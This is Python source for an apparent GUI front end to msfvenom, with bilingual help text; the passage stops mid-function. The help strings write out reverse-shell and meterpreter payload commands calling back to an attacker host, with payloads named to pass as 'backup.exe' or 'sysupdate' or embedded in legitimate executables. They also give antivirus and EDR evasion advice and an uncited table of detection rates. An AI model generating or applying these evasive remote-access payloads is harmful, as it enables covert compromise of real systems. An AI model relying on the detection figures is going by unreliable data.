# payloadman.py
# PayloadMan (Educational Tool)
# Autor: loopedman
# GitHub: https://github.com/loopedman
#
# DISCLAIMER:
# This tool is intended for educational purposes and authorized security testing only.
# The author is not responsible for any misuse or damage caused by this software.
# Users are solely responsible for their actions and must comply with all applicable laws.
# ============================================================================

"""
PayloadMan - Advanced MSFvenom

A comprehensive GUI tool for generating and managing Metasploit payloads with advanced
obfuscation techniques and educational resources.

Author: loopedman
GitHub: https://github.com/loopedman

LEGAL DISCLAIMER:
This software is provided for educational purposes and authorized security testing only.
Use only on systems you own or have explicit permission to test. The author assumes
no liability for any misuse or damage caused by this tool. Users are solely responsible for
complying with all applicable laws and regulations.

FEATURES:
- Multi-language support (English/Spanish)
- Advanced payload generation with MSFvenom
- Comprehensive obfuscation techniques
- Cross-platform payload support
- Educational resources and documentation
- Professional UI with responsive design
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import socket
import re
import os
import shlex
from datetime import datetime
import sys
import json
from pathlib import Path

# ============================================================================
# IMPROVED LANGUAGE SYSTEM
# ============================================================================

class Translator:
    def __init__(self, language='es'):
        self.language = language
        self.texts = {
            'es': self.get_spanish_texts(),
            'en': self.get_english_texts()
        }
    
    def get_spanish_texts(self):
        return {
            # Títulos principales
            'app_title': 'PayloadMan v1.0',
            'subtitle': 'Herramienta Educativa para Pruebas de Seguridad Autorizadas',
            'footer_disclaimer': 'PayloadMan - Solo para fines educativos y pruebas autorizadas',
            
            # Pestañas
            'tab_basic': 'Configuración Básica',
            'tab_advanced': 'Opciones Avanzadas',
            'tab_obfuscation': 'Técnicas de Ofuscación',
            'tab_extra': 'Payloads Adicionales',
            'tab_generate': 'Generar',
            'tab_about': 'Acerca de',
            
            # Configuración Básica
            'basic_config': 'Configuración Básica',
            'platform': 'Plataforma',
            'architecture': 'Arquitectura',
            'payload_type': 'Tipo de Payload',
            'lhost': 'LHOST (Tu IP)',
            'lport': 'LPORT (Puerto de Escucha)',
            'output_format': 'Formato de Salida',
            'output_filename': 'Nombre del Archivo',
            'output_directory': 'Directorio de Salida',
            'detect_ip': 'Detectar IP Local',
            'generate_name': 'Generar Nombre',
            'browse': 'Examinar...',
            'verbose_output': 'Salida detallada',
            'keep_files': 'Mantener archivos existentes',
            
            # Opciones Avanzadas
            'encoder_options': 'Opciones de Encoder',
            'bad_chars': 'Bad Characters',
            'memory_manipulation': 'Manipulación de Memoria',
            'additional_options': 'Opciones Adicionales',
            'encoder': 'Encoder:',
            'iterations': 'Iteraciones:',
            'badchars': 'Badchars:',
            'nop_sled': 'NOP Sled (bytes):',
            'prepend': 'Prepend Data:',
            'append': 'Append Data:',
            'custom_options': 'Opciones Personalizadas de MSFvenom:',
            
            # Botones comunes
            'generate': 'Generar Payload y Handler',
            'copy_command': 'Copiar Comando',
            'clear_output': 'Limpiar Salida',
            'show_handler': 'Mostrar Contenido del Handler',
            'close': 'Cerrar',
            'ok': 'OK',
            'apply': 'Aplicar',
            'cancel': 'Cancelar',
            
            # Mensajes de estado
            'ready': 'Listo',
            'generating': 'Generando payload...',
            'success': 'Payload generado exitosamente!',
            'failed': 'Error en la generación',
            'timeout': 'Tiempo de espera agotado',
            'not_found': 'msfvenom no encontrado',
            
            # Textos de ayuda
            'help_platform': 'Selecciona el sistema operativo objetivo:\n\nWindows: Payloads para sistemas Windows\nLinux: Payloads para distribuciones Linux\nAndroid: Payloads para dispositivos Android\nmacOS: Payloads para sistemas Apple macOS\nWeb: Payloads para aplicaciones web\nMulti: Payloads multiplataforma',
            
            'help_payload': 'Tipo de payload a generar:\n\nMeterpreter: Advanced payload con capacidades extendidas\nShell: Shell básica del sistema\nDLL/So: Bibliotecas dinámicas\nScript: Payloads en formato script\nStaged: Payload en dos etapas\nStageless: Payload completo en un solo archivo',
            
            'help_lhost': 'Local Host - IP del atacante:\n\n• Usa una IP local (192.168.x.x, 10.x.x.x, 172.16.x.x) para redes internas\n• Usa una IP pública para internet\n• El botón "Detectar IP Local" detecta automáticamente tu IP\n• Asegúrate de que el puerto esté abierto en el firewall',
            
            'help_lport': 'Local Port - Puerto de escucha:\n\nPuertos comunes:\n• 4444: Puerto por defecto de Metasploit\n• 443, 8443: Puertos HTTPS (menos sospechosos)\n• 80, 8080: Puertos HTTP\n• 53: Puerto DNS (a menudo sin filtrar)',
            
            'help_format': 'Formato de salida del payload:\n\nWindows:\n• exe: Ejecutable Windows\n• dll: Biblioteca dinámica\n• psh: PowerShell script\n• vbs: Visual Basic Script\n\nLinux:\n• elf: Ejecutable Linux\n• so: Biblioteca compartida\n\nOtros:\n• apk: Aplicación Android\n• raw: Binario crudo\n• c: Código fuente en C',
            
            'help_encoder': 'Codificador para ofuscar el payload:\n\nCodificadores comunes:\n• x86/shikata_ga_nai: Polimórfico, muy efectivo\n• x86/alpha_mixed: Solo caracteres alfanuméricos\n• x86/unicode_mixed: Unicode, evade filtros\n• cmd/powershell_base64: Para PowerShell\n\nEscribe "none" para no usar encoder',
            
            'help_iterations': 'Número de veces que se aplica el encoder:\n\n• 1-5: Normal (balance entre ofuscación y tamaño)\n• 6-10: Alta ofuscación (archivo más grande)\n• 11+: Máxima ofuscación (puede ser detectado)\n\nNota: Cada iteración aumenta el tamaño un 10-15%',
            
            'help_badchars': 'Caracteres prohibidos en el payload:\n\nEjemplos comunes:\n• \\x00: Null byte (terminador de cadena)\n• \\x0a, \\x0d: Nueva línea y retorno de carro\n• \\xff: Form feed\n• \\x20: Espacio (problemas en URLs)\n\nSintaxis:\n• \\x00\\x0a\\x0d\\xff\\x20\n• No es necesario repetir caracteres\n• Se pueden especificar rangos: \\x00-\\x1f',
            
            'help_nop': 'Número de instrucciones NOP (No Operation):\n\n• 0: Sin NOPs (payload más pequeño)\n• 8-64: Normal para buffer overflows\n• 65-512: Para exploits con offsets inciertos\n• 513+: Para avanzado DEP/ASLR bypass\n\nLos NOPs ayudan con la alineación de memoria pero aumentan el tamaño',
            
            # Técnicas de ofuscación
            'obf_general': '=== TÉCNICAS GENERALES DE OFUSCACIÓN ===\n\n1. ENCODING (MÁS COMÚN)\n   • Shikata Ga Nai: Codificador polimórfico XOR con retroalimentación\n     Ejemplo: x86/shikata_ga_nai -i 5 (5 iteraciones)\n   \n   • Alpha2: Codificador alfanumérico (evita filtros de caracteres)\n     Ejemplo: x86/alpha_mixed (solo letras y números)\n\n2. MÚLTIPLES ENCODERS (ENCADENAMIENTO)\n   Encadena múltiples codificadores para mejor evasión:\n   msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... \\\n            -e x86/shikata_ga_nai -i 3 \\\n            -e x86/countdown -i 2 \\\n            -f exe -o payload.exe\n\n3. EVASIÓN DE ANTIVIRUS:\n   • Usar plantillas personalizadas (con opción -x)\n   • Añadir archivos legítimos al payload\n   • Usar packers: UPX, MPRESS, VMProtect\n   • Sleep/delay para evadir sandboxes\n\n4. BYPASS DE WHITELISTING:\n   • Usar binarios Windows confiables\n   • PowerShell downgrade attacks\n   • DLL sideloading\n\nCADENAS DE ENCODERS RECOMENDADAS:\n   Para Windows: x86/shikata_ga_nai -> x86/countdown -> x86/alpha_mixed\n   Para Linux: x64/xor -> x64/zutto_dekiru\n   Para Web: php/base64 -> php/alpha2',
            
            'obf_windows': '=== OFUSCACIÓN PARA WINDOWS ===\n\n1. OBFUSCACIÓN DE EXE:\n   • Usar binarios firmados como plantillas\n   • Inyección en procesos legítimos\n   • Process Hollowing\n   • Inyección de DLL reflectiva\n\n   Ejemplo con plantilla:\n   msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... \\\n            -x /ruta/a/legitimo.exe -k \\\n            -f exe -o malicious.exe\n\n2. EVASIÓN DE POWERSHELL:\n   • Base64 encoding con compresión\n   • Nombres de variables ofuscados\n   • División y concatenación de strings\n   • Uso de ticks (`) en comandos\n\n3. DLL SIDELOADING:\n   • Reemplazar DLLs legítimas\n   • DLL Proxying para mantener funcionalidad',
            
            'obf_advanced': '=== MÉTODOS AVANZADOS ===\n\n1. CÓDICO POLIMÓRFICO:\n   • Generar payload único cada vez\n   • Usar diferentes encoders aleatoriamente\n   • Orden variable de instrucciones\n\n2. BYPASS DE EDR/ANTIVIRUS:\n   • Syscalls directos (evita hooks en userland)\n   • Técnicas de inyección de procesos\n   • Ejecución solo en memoria\n   • Detección de breakpoints hardware\n\nEJEMPLOS PRÁCTICOS:\n\nEjemplo 1: Payload Windows altamente ofuscado\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 \\\n         -e x86/shikata_ga_nai -i 7 \\\n         -b \'\\\\x00\\\\x0a\\\\x0d\\\\xff\' \\\n         --smallest \\\n         -x /usr/share/windows-binaries/plink.exe -k \\\n         -f exe -o backup.exe\n\nEjemplo 2: Payload Linux sigiloso\nmsfvenom -p linux/x64/shell/reverse_tcp LHOST=1.2.3.4 LPORT=53 \\\n         -e x64/xor \\\n         -f elf -o sysupdate\n\nTASAS DE DETECCIÓN:\nTipo de Payload          | Tasa de Detección AV\n-------------------------|---------------------\nRaw meterpreter         | 95%\nSingle encoder          | 70%\nDouble encoder chain    | 40%\nCustom template         | 25%\nAdvanced obfuscation    | <10%',
            
            # Payloads adicionales
            'win_payloads': '=== PAYLOADS WINDOWS (x86/x64) ===\n\nREVERSE SHELLS:\n• windows/shell_reverse_tcp              - Shell reversa normal\n• windows/x64/shell_reverse_tcp          - Shell reversa 64-bit\n• windows/shell_reverse_tcp_rc4          - Encriptada RC4\n• windows/shell_reverse_tcp_dns          - Recuperación DNS TXT\n\nMETERPRETER (REVERSE):\n• windows/meterpreter/reverse_tcp        - Meterpreter estándar\n• windows/x64/meterpreter/reverse_tcp    - Meterpreter 64-bit\n• windows/meterpreter/reverse_http       - Transporte HTTP\n• windows/meterpreter/reverse_https      - HTTPS (encriptado)\n\nDLL PAYLOADS:\n• windows/dllinject/reverse_tcp          - Inyección DLL reversa\n• windows/x64/dllinject/reverse_tcp      - Inyección DLL 64-bit\n\nPOWERSHELL:\n• windows/x64/powershell_reverse_tcp     - PowerShell reversa\n• windows/powershell_bind_tcp            - PowerShell bind',
            
            'linux_payloads': '=== PAYLOADS LINUX (x86/x64/ARM/MIPS) ===\n\nREVERSE SHELLS:\n• linux/x86/shell_reverse_tcp            - Shell reversa estándar\n• linux/x64/shell_reverse_tcp            - Shell reversa 64-bit\n• linux/x86/shell_reverse_tcp_ipv6       - Soporte IPv6\n• linux/armle/shell_reverse_tcp          - ARM little-endian\n\nMETERPRETER:\n• linux/x86/meterpreter/reverse_tcp      - x86 Meterpreter\n• linux/x64/meterpreter/reverse_tcp      - x64 Meterpreter\n• linux/x86/meterpreter/bind_tcp         - Bind TCP\n\nELF FORMAT:\n• linux/x86/exec                         - Ejecutar comando\n• linux/x64/exec                         - Ejecutar comando 64-bit\n• linux/x86/chmod                        - Cambiar permisos',
            
            'web_payloads': '=== WEB PAYLOADS (PHP/ASP/JSP/etc) ===\n\nPHP PAYLOADS:\n• php/meterpreter_reverse_tcp            - PHP Meterpreter\n• php/reverse_php                        - PHP shell reversa\n• php/bind_php                           - PHP bind shell\n• php/exec                               - Ejecutar comando\n\nASP PAYLOADS:\n• asp/meterpreter_reverse_tcp            - ASP Meterpreter\n• asp/shell_reverse_tcp                  - ASP shell reversa\n• asp/powershell_reverse_tcp             - ASP a PowerShell\n\nJSP PAYLOADS:\n• java/meterpreter/reverse_tcp           - Java Meterpreter\n• java/jsp_shell_reverse_tcp             - JSP shell reversa\n• java/jsp_shell_bind_tcp                - JSP bind shell',
            
            # Mensajes varios
            'select_language': 'Seleccionar Idioma',
            'language': 'Idioma',
            'spanish': 'Español',
            'english': 'English',
            'command_preview': 'Vista Previa del Comando',
            'generation_output': 'Salida de Generación',
            'handler_config': 'Configuración del Handler',
            'copy_to_clipboard': 'Copiar al Portapapeles',
            'general_help': 'Ayuda General',
            'ip_local': 'IP local detectada (red interna)',
            'ip_public': 'IP pública detectada',
            'ip_localhost': 'Localhost - solo para pruebas',
            'restart_required': 'Reinicio Requerido',
            'restart_message': 'Para aplicar el cambio de idioma es necesario reiniciar la aplicación.\n\n¿Desea reiniciar ahora?',
            'incompatible_option': 'Opción Incompatible',
            'x64_obfuscation_warning': 'Algunas técnicas de ofuscación x86 no están disponibles para x64',
            'x86_obfuscation_warning': 'Algunas técnicas de ofuscación x64 no están disponibles para x86',
            'encoder_warning': 'Advertencia: Algunos encoders pueden causar errores con ciertos payloads',
            
            # About section
            'about_title': 'Acerca de PayloadMan',
            'about_content': 'PAYLOADMAN v1.0 - GENERADOR AVANZADO DE PAYLOADS\n\n'
                           'Herramienta educativa para la generación y gestión de payloads de Metasploit.\n\n'
                           'INFORMACIÓN DEL AUTOR:\n'
                           '• Author: loopedman\n'
                           '• GitHub: https://github.com/loopedman\n\n'
                           'DISCLAIMER LEGAL (ESPAÑOL):\n'
                           'Esta herramienta está destinada únicamente a fines educativos y pruebas de seguridad autorizadas.\n'
                           'El uso de este software para atacar sistemas sin autorización expresa es ilegal.\n'
                           'El autor no se hace responsable del uso indebido o daños causados por este software.\n'
                           'El usuario es completamente responsable de cumplir con todas las leyes aplicables.\n\n'
                           'USO RECOMENDADO:\n'
                           '• Laboratorios de seguridad controlados\n'
                           '• Entornos de prueba autorizados\n'
                           '• Educación en ciberseguridad\n'
                           '• Evaluaciones de penetración con permiso escrito',
            
            # Nuevos mensajes para validación
            'android_raw_warning': '⚠ ANDROID: Solo formato RAW disponible. Los payloads de Android son datos brutos que deben integrarse manualmente en una aplicación legítima y compilarse con herramientas de desarrollo Android estándar.',
            'android_encoder_warning': 'ANDROID: No se permiten encoders. Los payloads de Android son shellcode raw que requiere integración manual.',
            'web_war_warning': '⚠ WEB: El formato WAR requiere empaquetado manual. Genera el payload en formato raw y empaquétalo manualmente en un archivo WAR.',
            'web_jar_warning': '⚠ WEB: El formato JAR solo es válido para payloads Java. Asegúrate de usar un payload java/* para este formato.',
            'invalid_platform_format': 'Formato incompatible: {format} no es válido para {platform}',
            'invalid_encoder_arch': 'Encoder incompatible: {encoder} no es válido para arquitectura {arch}',
            'payload_not_found': 'Payload no encontrado: {payload}',
            'format_not_found': 'Formato no encontrado: {format}',
            'preflight_check': 'Validación pre-flight en progreso...',
            'preflight_success': 'Validación pre-flight completada. Configuración válida.',
            'preflight_failed': 'Validación pre-flight falló. Corrige los errores antes de generar.',
        }
    
    def get_english_texts(self):
        return {
            # Main titles
            'app_title': 'PayloadMan - Advanced Payload Generator v1.0',
            'subtitle': 'Educational Tool for Authorized Security Testing',
            'footer_disclaimer': 'PayloadMan - For educational and authorized testing purposes only',
            
            # Tabs
            'tab_basic': 'Basic Configuration',
            'tab_advanced': 'Advanced Options',
            'tab_obfuscation': 'Obfuscation Techniques',
            'tab_extra': 'Additional Payloads',
            'tab_generate': 'Generate',
            'tab_about': 'About',
            
            # Basic Configuration
            'basic_config': 'Basic Configuration',
            'platform': 'Platform',
            'architecture': 'Architecture',
            'payload_type': 'Payload Type',
            'lhost': 'LHOST (Your IP)',
            'lport': 'LPORT (Listening Port)',
            'output_format': 'Output Format',
            'output_filename': 'Output Filename',
            'output_directory': 'Output Directory',
            'detect_ip': 'Detect Local IP',
            'generate_name': 'Generate Name',
            'browse': 'Browse...',
            'verbose_output': 'Verbose output',
            'keep_files': 'Keep existing files',
            
            # Advanced Options
            'encoder_options': 'Encoder Options',
            'bad_chars': 'Bad Characters',
            'memory_manipulation': 'Memory Manipulation',
            'additional_options': 'Additional Options',
            'encoder': 'Encoder:',
            'iterations': 'Iterations:',
            'badchars': 'Badchars:',
            'nop_sled': 'NOP Sled (bytes):',
            'prepend': 'Prepend Data:',
            'append': 'Append Data:',
            'custom_options': 'Custom MSFvenom Options:',
            
            # Common buttons
            'generate': 'Generate Payload & Handler',
            'copy_command': 'Copy Command',
            'clear_output': 'Clear Output',
            'show_handler': 'Show Handler Content',
            'close': 'Close',
            'ok': 'OK',
            'apply': 'Apply',
            'cancel': 'Cancel',
            
            # Status messages
            'ready': 'Ready',
            'generating': 'Generating payload...',
            'success': 'Payload generated successfully!',
            'failed': 'Generation failed',
            'timeout': 'Command timed out',
            'not_found': 'msfvenom not found',
            
            # Help texts
            'help_platform': 'Select the target operating system:\n\nWindows: Payloads for Windows systems\nLinux: Payloads for Linux distributions\nAndroid: Payloads for Android devices\nmacOS: Payloads for Apple macOS systems\nWeb: Payloads for web applications\nMulti: Cross-platform payloads',
            
            'help_payload': 'Type of payload to generate:\n\nMeterpreter: Advanced payload with extended capabilities\nShell: Basic system shell\nDLL/So: Dynamic libraries\nScript: Script format payloads\nStaged: Two-stage payload\nStageless: Complete payload in single file',
            
            'help_lhost': 'Local Host - Attacker\'s IP:\n\n• Use a local IP (192.168.x.x, 10.x.x.x, 172.16.x.x) for internal networks\n• Use a public IP for internet\n• The "Detect Local IP" button automatically detects your IP\n• Make sure the port is open in the firewall',
            
            'help_lport': 'Local Port - Listening port:\n\nCommon ports:\n• 4444: Default Metasploit port\n• 443, 8443: HTTPS ports (less suspicious)\n• 80, 8080: HTTP ports\n• 53: DNS port (often unfiltered)',
            
            'help_format': 'Output format of the payload:\n\nWindows:\n• exe: Windows executable\n• dll: Dynamic library\n• psh: PowerShell script\n• vbs: Visual Basic Script\n\nLinux:\n• elf: Linux executable\n• so: Shared library\n\nOthers:\n• apk: Android application\n• raw: Raw binary\n• c: C source code',
            
            'help_encoder': 'Encoder to obfuscate the payload:\n\nCommon encoders:\n• x86/shikata_ga_nai: Polymorphic, very effective\n• x86/alpha_mixed: Alphanumeric only\n• x86/unicode_mixed: Unicode, evades filters\n• cmd/powershell_base64: For PowerShell\n\nWrite "none" to not use encoder',
            
            'help_iterations': 'Number of times the encoder is applied:\n\n• 1-5: Normal (balance between obfuscation and size)\n• 6-10: High obfuscation (larger file)\n• 11+: Maximum obfuscation (may be detected)\n\nNote: Each iteration increases size by 10-15%',
            
            'help_badchars': 'Forbidden characters in the payload:\n\nCommon examples:\n• \\x00: Null byte (string terminator)\n• \\x0a, \\x0d: New line and carriage return\n• \\xff: Form feed\n• \\x20: Space (issues in URLs)\n\nSyntax:\n• \\x00\\x0a\\x0d\\xff\\x20\n• No need to repeat characters\n• Ranges can be specified: \\x00-\\x1f',
            
            'help_nop': 'Number of NOP (No Operation) instructions:\n\n• 0: No NOPs (smaller payload)\n• 8-64: Normal for buffer overflows\n• 65-512: For exploits with uncertain offsets\n• 513+: For advanced DEP/ASLR bypass\n\nNOPs help with memory alignment but increase size',
            
            # Obfuscation techniques
            'obf_general': '=== GENERAL OBFUSCATION TECHNIQUES ===\n\n1. ENCODING (MOST COMMON)\n   • Shikata Ga Nai: Polymorphic XOR additive feedback encoder\n     Example: x86/shikata_ga_nai -i 5 (5 iterations)\n   \n   • Alpha2: Alphanumeric encoder (bypasses character filters)\n     Example: x86/alpha_mixed (only letters and numbers)\n\n2. MULTIPLE ENCODERS (CHAINING)\n   Chain multiple encoders for better evasion:\n   msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... \\\n            -e x86/shikata_ga_nai -i 3 \\\n            -e x86/countdown -i 2 \\\n            -f exe -o payload.exe\n\n3. ANTIVIRUS EVASION TIPS:\n   • Use custom templates (with -x option)\n   • Append legitimate files to payload\n   • Use packers: UPX, MPRESS, VMProtect\n   • Sleep/delay execution to bypass sandboxes\n\nRECOMMENDED ENCODER CHAINS:\n   For Windows: x86/shikata_ga_nai -> x86/countdown -> x86/alpha_mixed\n   For Linux: x64/xor -> x64/zutto_dekiru\n   For Web: php/base64 -> php/alpha2',
            
            'obf_windows': '=== WINDOWS OBFUSCATION ===\n\n1. EXE OBFUSCATION:\n   • Use signed binaries as templates\n   • Inject into legitimate processes\n   • Process Hollowing\n   • Reflective DLL Injection\n\n   Example with template:\n   msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... \\\n            -x /path/to/legitimate.exe -k \\\n            -f exe -o malicious.exe\n\n2. POWERSHELL EVASION:\n   • Base64 encoding with compression\n   • Obfuscated variable names\n   • String splitting and concatenation\n   • Use of ticks (`) in commands\n\n3. DLL SIDELOADING:\n   • Replace legitimate DLLs\n   • DLL Proxying to maintain functionality',
            
            'obf_advanced': '=== ADVANCED METHODS ===\n\n1. POLYMORPHIC CODE:\n   • Generate unique payload each time\n   • Use different encoders randomly\n   • Variable instruction ordering\n\n2. BYPASSING EDR/ANTIVIRUS:\n   • Direct syscalls (bypass userland hooks)\n   • Process injection techniques\n   • Memory-only execution\n   • Hardware breakpoint detection\n\nPRACTICAL EXAMPLES:\n\nExample 1: Highly obfuscated Windows payload\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 \\\n         -e x86/shikata_ga_nai -i 7 \\\n         -b \'\\\\x00\\\\x0a\\\\x0d\\\\xff\' \\\n         --smallest \\\n         -x /usr/share/windows-binaries/plink.exe -k \\\n         -f exe -o backup.exe\n\nExample 2: Stealthy Linux payload\nmsfvenom -p linux/x64/shell/reverse_tcp LHOST=1.2.3.4 LPORT=53 \\\n         -e x64/xor \\\n         -f elf -o sysupdate\n\nDETECTION RATES:\nPayload Type          | AV Detection Rate\n----------------------|------------------\nRaw meterpreter      | 95%\nSingle encoder       | 70%\nDouble encoder chain | 40%\nCustom template      | 25%\nAdvanced obfuscation | <10%',
            
            # Additional payloads
            'win_payloads': '=== WINDOWS PAYLOADS (x86/x64) ===\n\nREVERSE SHELLS:\n• windows/shell_reverse_tcp              - Normal reverse shell\n• windows/x64/shell_reverse_tcp          - 64-bit reverse shell\n• windows/shell_reverse_tcp_rc4          - RC4 encrypted\n• windows/shell_reverse_tcp_dns          - DNS TXT record retrieval\n\nMETERPRETER (REVERSE):\n• windows/meterpreter/reverse_tcp        - Standard Meterpreter\n• windows/x64/meterpreter/reverse_tcp    - 64-bit Meterpreter\n• windows/meterpreter/reverse_http       - HTTP transport\n• windows/meterpreter/reverse_https      - HTTPS (encrypted)\n\nDLL PAYLOADS:\n• windows/dllinject/reverse_tcp          - DLL inject reverse\n• windows/x64/dllinject/reverse_tcp      - 64-bit DLL inject\n\nPOWERSHELL:\n• windows/x64/powershell_reverse_tcp     - PowerShell reverse\n• windows/powershell_bind_tcp            - PowerShell bind',
            
            'linux_payloads': '=== LINUX PAYLOADS (x86/x64/ARM/MIPS) ===\n\nREVERSE SHELLS:\n• linux/x86/shell_reverse_tcp            - Standard reverse\n• linux/x64/shell_reverse_tcp            - 64-bit reverse\n• linux/x86/shell_reverse_tcp_ipv6       - IPv6 support\n• linux/armle/shell_reverse_tcp          - ARM little-endian\n\nMETERPRETER:\n• linux/x86/meterpreter/reverse_tcp      - x86 Meterpreter\n• linux/x64/meterpreter/reverse_tcp      - x64 Meterpreter\n• linux/x86/meterpreter/bind_tcp         - Bind TCP\n\nELF FORMAT:\n• linux/x86/exec                         - Execute command\n• linux/x64/exec                         - 64-bit exec\n• linux/x86/chmod                        - Change permissions',
            
            'web_payloads': '=== WEB PAYLOADS (PHP/ASP/JSP/etc) ===\n\nPHP PAYLOADS:\n• php/meterpreter_reverse_tcp            - PHP Meterpreter\n• php/reverse_php                        - PHP reverse shell\n• php/bind_php                           - PHP bind shell\n• php/exec                               - Execute command\n\nASP PAYLOADS:\n• asp/meterpreter_reverse_tcp            - ASP Meterpreter\n• asp/shell_reverse_tcp                  - ASP reverse shell\n• asp/powershell_reverse_tcp             - ASP to PowerShell\n\nJSP PAYLOADS:\n• java/meterpreter/reverse_tcp           - Java Meterpreter\n• java/jsp_shell_reverse_tcp             - JSP reverse shell\n• java/jsp_shell_bind_tcp                - JSP bind shell',
            
            # Various messages
            'select_language': 'Select Language',
            'language': 'Language',
            'spanish': 'Spanish',
            'english': 'English',
            'command_preview': 'Command Preview',
            'generation_output': 'Generation Output',
            'handler_config': 'Handler Configuration',
            'copy_to_clipboard': 'Copy to Clipboard',
            'general_help': 'General Help',
            'ip_local': 'Local IP detected (internal network)',
            'ip_public': 'Public IP detected',
            'ip_localhost': 'Localhost - for testing only',
            'restart_required': 'Restart Required',
            'restart_message': 'To apply language change, the application needs to restart.\n\nDo you want to restart now?',
            'incompatible_option': 'Incompatible Option',
            'x64_obfuscation_warning': 'Some x86 obfuscation techniques are not available for x64',
            'x86_obfuscation_warning': 'Some x64 obfuscation techniques are not available for x86',
            'encoder_warning': 'Warning: Some encoders may cause errors with certain payloads',
            
            # About section
            'about_title': 'About PayloadMan',
            'about_content': 'PAYLOADMAN v1.0\n\n'
                           'Educational tool for Metasploit payload generation and management.\n\n'
                           'AUTHOR INFORMATION:\n'
                           '• Author: loopedman\n'
                           '• GitHub: https://github.com/loopedman\n\n'
                           'LEGAL DISCLAIMER (ENGLISH):\n'
                           'This tool is intended for educational purposes and authorized security testing only.\n'
                           'Using this software to attack systems without explicit permission is illegal.\n'
                           'The author is not responsible for any misuse or damage caused by this software.\n'
                           'Users are solely responsible for complying with all applicable laws.\n\n'
                           'RECOMMENDED USE:\n'
                           '• Controlled security labs\n'
                           '• Authorized testing environments\n'
                           '• Cybersecurity education\n'
                           '• Penetration testing with written permission',
            
            # New validation messages
            'android_raw_warning': '⚠ ANDROID: Only RAW format available. Android payloads are raw data that must be manually integrated into a legitimate Android application and compiled using standard Android development tools.',
            'android_encoder_warning': 'ANDROID: Encoders not allowed. Android payloads are raw shellcode requiring manual integration.',
            'web_war_warning': '⚠ WEB: WAR format requires manual packaging. Generate payload in raw format and manually package it into a WAR file.',
            'web_jar_warning': '⚠ WEB: JAR format only valid for Java payloads. Ensure you use a java/* payload for this format.',
            'invalid_platform_format': 'Incompatible format: {format} is not valid for {platform}',
            'invalid_encoder_arch': 'Incompatible encoder: {encoder} is not valid for architecture {arch}',
            'payload_not_found': 'Payload not found: {payload}',
            'format_not_found': 'Format not found: {format}',
            'preflight_check': 'Pre-flight validation in progress...',
            'preflight_success': 'Pre-flight validation completed. Configuration valid.',
            'preflight_failed': 'Pre-flight validation failed. Fix errors before generating.',
        }
    
    def t(self, key):
        """Get translation for a key"""
        return self.texts.get(self.language, {}).get(key, key)
    
    def set_language(self, language):
        """Change language"""
        self.language = language

def show_help(title, text, parent):
    win = tk.Toplevel(parent)
    win.title(f"Ayuda: {title}" if isinstance(parent, PayloadManGUI) and parent.translator.language == 'es' else f"Help: {title}")
    win.geometry("700x500")
    win.configure(bg="#162233")
    win.transient(parent)
    win.grab_set()
    
    # Make window resizable
    win.resizable(True, True)
    
    # Header
    header = tk.Frame(win, bg="#336699")
    header.pack(fill="x", padx=0, pady=0)
    tk.Label(header, text=title, bg="#336699", fg="white", 
             font=("Helvetica", 12, "bold")).pack(pady=8)
    
    # Content with scrollbar
    content_frame = tk.Frame(win, bg="#0b1220")
    content_frame.pack(fill="both", expand=True, padx=10, pady=10)
    
    txt = scrolledtext.ScrolledText(content_frame, wrap="word", 
                                     bg="#0b1220", fg="#e5e7eb", 
                                     relief="flat", font=("Helvetica", 10))
    txt.pack(fill="both", expand=True)
    txt.insert("1.0", text)
    txt.configure(state="disabled")
    
    # Footer
    footer = tk.Frame(win, bg="#162233")
    footer.pack(fill="x", padx=10, pady=(0,10))
    close_text = "Cerrar" if isinstance(parent, PayloadManGUI) and parent.translator.language == 'es' else "Close"
    tk.Button(footer, text=close_text, command=win.destroy, 
              bg="#336699", fg="white", padx=20).pack()

# ============================================================================
# CACHE SYSTEM FOR MSFVENOM DATA
# ============================================================================

class MsfvenomCache:
    def __init__(self):
        self.cache_dir = Path.home() / ".payloadman"
        self.cache_dir.mkdir(exist_ok=True)
        self.payloads_cache_file = self.cache_dir / "payloads_cache.json"
        self.formats_cache_file = self.cache_dir / "formats_cache.json"
        self.payloads = {}
        self.formats = []
        
    def load_cache(self):
        """Load cached msfvenom data or fetch fresh data"""
        try:
            # Try to load from cache first
            if self.payloads_cache_file.exists():
                with open(self.payloads_cache_file, 'r') as f:
                    self.payloads = json.load(f)
            
            if self.formats_cache_file.exists():
                with open(self.formats_cache_file, 'r') as f:
                    self.formats = json.load(f)
            
            # If cache is empty, fetch fresh data
            if not self.payloads or not self.formats:
                self.fetch_fresh_data()
        except Exception as e:
            print(f"Cache load error: {e}")
            self.fetch_fresh_data()
    
    def fetch_fresh_data(self):
        """Fetch fresh data from msfvenom"""
        try:
            # Fetch payloads
            result = subprocess.run(['msfvenom', '--list', 'payloads'], 
                                   capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                self.parse_payloads(result.stdout)
                with open(self.payloads_cache_file, 'w') as f:
                    json.dump(self.payloads, f)
            
            # Fetch formats
            result = subprocess.run(['msfvenom', '--list', 'formats'], 
                                   capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                self.parse_formats(result.stdout)
                with open(self.formats_cache_file, 'w') as f:
                    json.dump(self.formats, f)
                    
        except (subprocess.TimeoutExpired, FileNotFoundError):
            # Use fallback data if msfvenom not available
            self.use_fallback_data()
    
    def parse_payloads(self, output):
        """Parse msfvenom --list payloads output"""
        lines = output.split('\n')
        in_payload_section = False
        
        for line in lines:
            if line.startswith('---'):
                in_payload_section = True
                continue
            
            if in_payload_section and line.strip():
                parts = line.strip().split()
                if len(parts) >= 2:
                    name = parts[0]
                    description = ' '.join(parts[1:])
                    
                    # Categorize by platform
                    platform = self.detect_platform_from_payload(name)
                    self.payloads[name] = {
                        'platform': platform,
                        'description': description
                    }
    
    def parse_formats(self, output):
        """Parse msfvenom --list formats output"""
        lines = output.split('\n')
        in_format_section = False
        
        for line in lines:
            if line.startswith('---'):
                in_format_section = True
                continue
            
            if in_format_section and line.strip():
                parts = line.strip().split()
                if parts:
                    self.formats.append(parts[0])
    
    def detect_platform_from_payload(self, payload):
        """Detect platform from payload name"""
        payload_lower = payload.lower()
        
